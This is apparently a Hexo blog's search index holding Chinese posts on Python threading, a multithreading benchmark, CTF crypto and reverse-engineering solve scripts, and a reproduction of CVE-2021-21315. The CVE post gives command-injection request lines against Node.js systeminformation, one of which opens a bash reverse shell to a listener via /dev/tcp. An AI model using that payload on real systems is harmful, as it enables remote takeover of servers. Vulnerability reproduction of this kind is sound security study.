<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>线程通信机制</title>
    <link href="/2021/11/07/Python/%E5%B9%B6%E5%8F%91%E5%88%9D%E5%AD%A6/%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1%E6%9C%BA%E5%88%B6/"/>
    <url>/2021/11/07/Python/%E5%B9%B6%E5%8F%91%E5%88%9D%E5%AD%A6/%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="线程通信机制"><a href="#线程通信机制" class="headerlink" title="线程通信机制"></a>线程通信机制</h1><p>此处主要介绍的是控制线程的触发执行，线程中通信的方法大致如下</p><ol><li>threading.Event</li><li>threading.Condition</li><li>queque.Queue</li></ol><h1 id="1-threading-Event"><a href="#1-threading-Event" class="headerlink" title="1. threading.Event"></a>1. threading.Event</h1>]]></content>
    
    
    <categories>
      
      <category>Python 并发初学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>并发</tag>
      
      <tag>线程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>对比及多线程</title>
    <link href="/2021/11/07/Python/%E5%B9%B6%E5%8F%91%E5%88%9D%E5%AD%A6/%E5%AF%B9%E6%AF%94%E5%8F%8A%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    <url>/2021/11/07/Python/%E5%B9%B6%E5%8F%91%E5%88%9D%E5%AD%A6/%E5%AF%B9%E6%AF%94%E5%8F%8A%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="对比及多线程"><a href="#对比及多线程" class="headerlink" title="对比及多线程"></a>对比及多线程</h1><h1 id="1-对比"><a href="#1-对比" class="headerlink" title="1. 对比"></a>1. 对比</h1><p>首先是单线程，多线程和多进程的对比</p><p>此处简单用图片显示一下Python中的多线程和多进程</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/202111071705091.jpg" alt="多线程"></p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/202111071705147.jpg" alt="多进程"></p><p>具体代码如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 单线程VS多线程VS多进程</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-comment"># 时间计时器的装饰器</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">timer</span>(<span class="hljs-params">mode</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">func</span>):</span><br>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deco</span>(<span class="hljs-params">*args, **kw</span>):</span><br>            <span class="hljs-built_in">type</span> = kw.setdefault(<span class="hljs-string">&#x27;type&#x27;</span>, <span class="hljs-literal">None</span>)<br>            t1=time.time()<br>            func(*args, **kw)<br>            t2=time.time()<br>            cost_time = t2-t1<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;-&#123;&#125;花费时间：&#123;&#125;秒&quot;</span>.<span class="hljs-built_in">format</span>(mode, <span class="hljs-built_in">type</span>,cost_time))<br>        <span class="hljs-keyword">return</span> deco<br>    <span class="hljs-keyword">return</span> wrapper<br><span class="hljs-comment"># 单线程计时</span><br><span class="hljs-meta">@timer(<span class="hljs-params"><span class="hljs-string">&#x27;[单线程]&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">single_thread</span>(<span class="hljs-params">func, <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;&quot;</span></span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        func()<br><span class="hljs-comment"># 多线程计时</span><br><span class="hljs-meta">@timer(<span class="hljs-params"><span class="hljs-string">&quot;[多线程]&quot;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">multi_thread</span>(<span class="hljs-params">func, <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;&quot;</span></span>):</span><br>    thread_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        t=Thread(target=func, args=())<br>        thread_list.append(t)<br>        t.start()<br>    e = <span class="hljs-built_in">len</span>(thread_list)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> th <span class="hljs-keyword">in</span> thread_list:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> th.is_alive():<br>                e -= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> e &lt;= <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment"># 多进程计时</span><br><span class="hljs-meta">@timer(<span class="hljs-params"><span class="hljs-string">&quot;[多进程]&quot;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">multi_process</span>(<span class="hljs-params">func, <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;&quot;</span></span>):</span><br>    process_list = []<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        p = Process(target=func, args=())<br>        process_list.append(p)<br>        p.start()<br>    e = process_list.__len__()<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> pr <span class="hljs-keyword">in</span> process_list:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> pr.is_alive():<br>                e -= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> e &lt;= <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment"># CPU计算密集型</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">count</span>(<span class="hljs-params">x=<span class="hljs-number">1</span>, y=<span class="hljs-number">1</span></span>):</span><br>    <span class="hljs-comment"># 使程序完成150万计算</span><br>    c = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> c &lt; <span class="hljs-number">500000</span>:<br>        c += <span class="hljs-number">1</span><br>        x += x<br>        y += y<br><br><br><span class="hljs-comment"># 磁盘读写IO密集型</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">io_disk</span>():</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;file.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5000000</span>):<br>            f.write(<span class="hljs-string">&quot;python-learning\n&quot;</span>)<br><br><br><span class="hljs-comment"># 网络IO密集型</span><br>header = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36&#x27;</span>&#125;<br>url = <span class="hljs-string">&quot;https://www.tieba.com/&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">io_request</span>():</span><br>    <span class="hljs-keyword">try</span>:<br>        webPage = requests.get(url, headers=header)<br>        html = webPage.text<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: e&#125;<br><br><br><span class="hljs-comment"># 【模拟】IO密集型</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">io_simulation</span>():</span><br>    time.sleep(<span class="hljs-number">2</span>)<br><br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 单线程</span><br>    single_thread(count, <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;CPU计算密集型&quot;</span>)<br>    single_thread(io_disk, <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;磁盘IO密集型&quot;</span>)<br>    single_thread(io_request,<span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;网络IO密集型&quot;</span>)<br>    single_thread(io_simulation,<span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;模拟IO密集型&quot;</span>)<br><br>    <span class="hljs-comment"># 多线程</span><br>    multi_thread(count, <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;CPU计算密集型&quot;</span>)<br>    multi_thread(io_disk, <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;磁盘IO密集型&quot;</span>)<br>    multi_thread(io_request, <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;网络IO密集型&quot;</span>)<br>    multi_thread(io_simulation, <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;模拟IO密集型&quot;</span>)<br>    <br>    <span class="hljs-comment"># 多进程</span><br>    multi_process(count, <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;CPU计算密集型&quot;</span>)<br>    multi_process(io_disk, <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;磁盘IO密集型&quot;</span>)<br>    multi_process(io_request, <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;网络IO密集型&quot;</span>)<br>    multi_process(io_simulation, <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;模拟IO密集型&quot;</span>)<br></code></pre></div></td></tr></table></figure><p>输出结果参考</p><table><thead><tr><th>种类</th><th>CPU计算密集型</th><th>磁盘IO密集型</th><th>网络IO密集型</th><th>模拟IO密集型</th></tr></thead><tbody><tr><td>单线程</td><td>59.79</td><td>20.25</td><td>2.31</td><td>20.08</td></tr><tr><td>多线程</td><td>48.14</td><td>98.81</td><td>0.35</td><td>2.03</td></tr><tr><td>多进程</td><td>14.27</td><td>6.18</td><td>0.59</td><td>2.37</td></tr></tbody></table><p>与参考的博客差距较大，但是还是可以得到在大部分情况下多进程都是较快的，而多线程是适合在IO密集场景下使用</p><h1 id="2-多线程"><a href="#2-多线程" class="headerlink" title="2. 多线程"></a>2. 多线程</h1><p>简单介绍基础的多线程创建，和函数</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time <br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><br><br><span class="hljs-comment"># 函数创建多线程</span><br><span class="hljs-comment"># 自定义线程函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">target</span>(<span class="hljs-params">name=<span class="hljs-string">&#x27;Python&#x27;</span></span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello&#x27;</span>,name)<br>        time.sleep(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-comment"># 创建线程01，不指定参数</span><br>thread_01 = Thread(target=target)<br><span class="hljs-comment"># 启动线程01</span><br>thread_01.start()<br><br><span class="hljs-comment"># 创建线程02，指定参数，注意逗号</span><br>thread_02 = Thread(target=target, args=(<span class="hljs-string">&quot;Lwx&quot;</span>,))<br><span class="hljs-comment"># 启动线程02</span><br>thread_02.start()<br><br><br><br><br><br><span class="hljs-comment"># 类创建多线程</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyThread</span>(<span class="hljs-params">Thread</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;Python&quot;</span></span>):</span><br>        <span class="hljs-comment"># 注意：super().__init__() 必须写</span><br>        <span class="hljs-comment"># 且最好写在第一行</span><br>        <span class="hljs-built_in">super</span>().__init__()<br>        self.<span class="hljs-built_in">type</span>=<span class="hljs-built_in">type</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hello&quot;</span>, self.<span class="hljs-built_in">type</span>)<br>            time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 创建线程01，不指定参数</span><br>    thread_01 = MyThread()<br>    <span class="hljs-comment"># 创建线程02，指定参数</span><br>    thread_02 = MyThread(<span class="hljs-string">&quot;Lwx_Class&quot;</span>)<br><br>    thread_01.start()<br>    thread_02.start()<br><br><span class="hljs-comment"># 常用的线程函数</span><br>t=Thread(target=target)<br><br><span class="hljs-comment"># 启动子线程</span><br>t.start()<br><br><span class="hljs-comment"># 阻塞子线程，待子线程结束后，再往下执行</span><br>t.join()<br><br><span class="hljs-comment"># 判断线程是否在执行状态，在执行返回True，否则返回False</span><br>t.is_alive()<br>t.isAlive()<br><br><span class="hljs-comment"># 设置线程是否随主线程退出而退出，默认为False</span><br>t.daemon = <span class="hljs-literal">True</span><br>t.daemon = <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 设置线程名</span><br>t.name = <span class="hljs-string">&quot;My-Thread&quot;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python 并发初学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>并发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Node.js 命令执行 (CVE-2021-21315)</title>
    <link href="/2021/10/29/%E4%BF%A1%E5%AE%89/%E5%A4%8D%E7%8E%B0/Node.js%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20(CVE-2021-21315)/"/>
    <url>/2021/10/29/%E4%BF%A1%E5%AE%89/%E5%A4%8D%E7%8E%B0/Node.js%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20(CVE-2021-21315)/</url>
    
    <content type="html"><![CDATA[<h1 id="Node-js-命令执行-CVE-2021-21315"><a href="#Node-js-命令执行-CVE-2021-21315" class="headerlink" title="Node.js 命令执行 (CVE-2021-21315)"></a>Node.js 命令执行 (CVE-2021-21315)</h1><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>Node.js-systeminformation是用于获取各种系统信息的Node.JS模块，包含多种轻量级功能，可以检索详细的硬件和系统相关信息</p><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>受影响的systeminformation版本：Systeminformation &lt; 5.3.1</p><h1 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h1><p>查看systeminfomation版本，在node_mudles同级目录下，找到package-lova.json文件打开，并搜索systeminfomation即可查看</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc"># 写入文件<br><span class="hljs-link">http://IP:PORT/api/getServices?name</span>[<span class="hljs-string"></span>]=$(echo -e <span class="hljs-emphasis">&#x27;kanhayou&#x27;</span> &gt; test.txt)<br># 反弹shell<br><span class="hljs-link">http://IP:PORT/api/getServices?name</span>[<span class="hljs-string"></span>]=$(bash -i &gt;&amp; /dev/tcp/192.168.6.100/44444 0&gt;&amp;1)<br></code></pre></div></td></tr></table></figure><p>在查看</p>]]></content>
    
    
    <categories>
      
      <category>信安 复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>复现</tag>
      
      <tag>Node.js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GXUCTF-1 Crypto</title>
    <link href="/2021/10/18/%E4%BF%A1%E5%AE%89/CTF/Crypto/GXUCTF-1%20Crypto/"/>
    <url>/2021/10/18/%E4%BF%A1%E5%AE%89/CTF/Crypto/GXUCTF-1%20Crypto/</url>
    
    <content type="html"><![CDATA[<h1 id="GXUCTF-1-Crypto"><a href="#GXUCTF-1-Crypto" class="headerlink" title="GXUCTF-1 Crypto"></a>GXUCTF-1 Crypto</h1><h1 id="累死自己，卷死同行"><a href="#累死自己，卷死同行" class="headerlink" title="累死自己，卷死同行"></a>累死自己，卷死同行</h1><p>先使用Brainfuck解码，再使用Ook解码，之后再使用16进制转字符，最后使用栅栏解码即可</p><h1 id="⊕"><a href="#⊕" class="headerlink" title="⊕"></a>⊕</h1><p>创建脚本</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">enc = <span class="hljs-string">&quot;&amp;;*~^|%)%`#~$;*`%:$;%:%%%^$;!)$;%*%)&amp;($;%^%^&amp;)%:^/$;#)*/^~%:^)%;&amp;|^`&quot;</span><br>convert = <span class="hljs-string">&quot;!@#$%^&amp;*()~`|/:;&quot;</span><br>m = [];<br>o = [];<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(enc),<span class="hljs-number">2</span>):<br>    m.append(convert.find(enc[i]));<br>    o.append(convert.find(enc[i+<span class="hljs-number">1</span>]));<br>m.reverse()<br>o.reverse()<br>a = [<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m]<br>b = [<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> o]<br>c = []<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    c.append(a[j][<span class="hljs-number">0</span>]+b[j][<span class="hljs-number">0</span>]+a[j][<span class="hljs-number">1</span>]+b[j][<span class="hljs-number">1</span>]+a[j][<span class="hljs-number">2</span>]+b[j][<span class="hljs-number">2</span>]+a[j][<span class="hljs-number">3</span>]+b[j][<span class="hljs-number">3</span>])<br>s=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    s+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">2</span>))<br><span class="hljs-built_in">print</span>(s)<br></code></pre></div></td></tr></table></figure><h1 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h1><p>观察发现，使用的应该是DES加密，网上找到解密工具<a href="http://tool.chacuo.net/cryptdes">http://tool.chacuo.net/cryptdes</a></p><p>依次填入后多选集中填充方式即可即可</p><h1 id="encrypt"><a href="#encrypt" class="headerlink" title="encrypt"></a>encrypt</h1><p>组内大佬的脚本</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random, base64<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">crypt</span>(<span class="hljs-params">out, key</span>):</span><br>    x = <span class="hljs-number">0</span><br>    box = <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        x = (x + box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span><br>        box[i], box[x] = box[x], box[i]<br>    x = y = <span class="hljs-number">0</span><br>    data =<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> out:<br>        <span class="hljs-built_in">print</span>(t+<span class="hljs-string">&quot;666&quot;</span>)<br>        x = (x + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        y = (y + box[x]) % <span class="hljs-number">256</span><br>        box[x], box[y] = box[y], box[x]<br>        char = <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(t)^box[(box[x]+box[y])%<span class="hljs-number">256</span>]))<br>        data +=char<br>    <span class="hljs-built_in">print</span>(data)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tencode</span>(<span class="hljs-params">data,key,decode=base64.b64decode</span>):</span><br>    <span class="hljs-built_in">print</span>(decode)<br>    <span class="hljs-keyword">if</span> decode:<br>        data = decode(data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hh&quot;</span>)<br>        salt = data[<span class="hljs-number">0</span>:<span class="hljs-number">16</span>]<br>        out = data[<span class="hljs-number">16</span>:]<br>        crypt(out, sha1(key + salt).digest())<br><br><br><br>tencode(data=<span class="hljs-string">&quot;vwCb/kXWabqgbxnFT0Yp4LdKdOwrJDAUNJjaH8om4dipEZl9PJulGQ8MeoSIf+ySR/WYVdgNqpk=&quot;</span>,key=<span class="hljs-string">&quot;welcometogxuctf&quot;</span>);<br><span class="hljs-comment"># data2=base64.b64decode(&quot;Z3h1Y3Rmey4uLn0=&quot;)</span><br><span class="hljs-comment"># print(data2)</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>信安 CTF Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GXUCTF-1 Reverse</title>
    <link href="/2021/10/18/%E4%BF%A1%E5%AE%89/CTF/Reverse/GXUCTF-1%20Reverse/"/>
    <url>/2021/10/18/%E4%BF%A1%E5%AE%89/CTF/Reverse/GXUCTF-1%20Reverse/</url>
    
    <content type="html"><![CDATA[<h1 id="GXUCTF-1-Reverse"><a href="#GXUCTF-1-Reverse" class="headerlink" title="GXUCTF-1 Reverse"></a>GXUCTF-1 Reverse</h1><h1 id="除了我以外都是非酋！！"><a href="#除了我以外都是非酋！！" class="headerlink" title="除了我以外都是非酋！！"></a>除了我以外都是非酋！！</h1><p>利用ida打开后按F5,看流程靠后的两个函数即可得到flag</p><h1 id="看看程序就出来啦"><a href="#看看程序就出来啦" class="headerlink" title="看看程序就出来啦"></a>看看程序就出来啦</h1><p>根据对应的python内容构造python脚本</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">flag=<span class="hljs-string">&#x27;&#x27;</span><br>salts = [<span class="hljs-number">141</span>, <span class="hljs-number">163</span>, <span class="hljs-number">24</span>, <span class="hljs-number">80</span>, <span class="hljs-number">114</span>, <span class="hljs-number">215</span>, <span class="hljs-number">112</span>, <span class="hljs-number">171</span>, <span class="hljs-number">56</span>, <span class="hljs-number">105</span>, <span class="hljs-number">157</span>, <span class="hljs-number">156</span>, <span class="hljs-number">193</span>, <span class="hljs-number">33</span>, <span class="hljs-number">57</span>, <span class="hljs-number">2</span>, <span class="hljs-number">231</span>, <span class="hljs-number">47</span>, <span class="hljs-number">191</span>, <span class="hljs-number">120</span>, <span class="hljs-number">203</span>, <span class="hljs-number">67</span>, <span class="hljs-number">238</span>, <span class="hljs-number">174</span>, <span class="hljs-number">75</span>, <span class="hljs-number">132</span>, <span class="hljs-number">250</span>, <span class="hljs-number">205</span>, <span 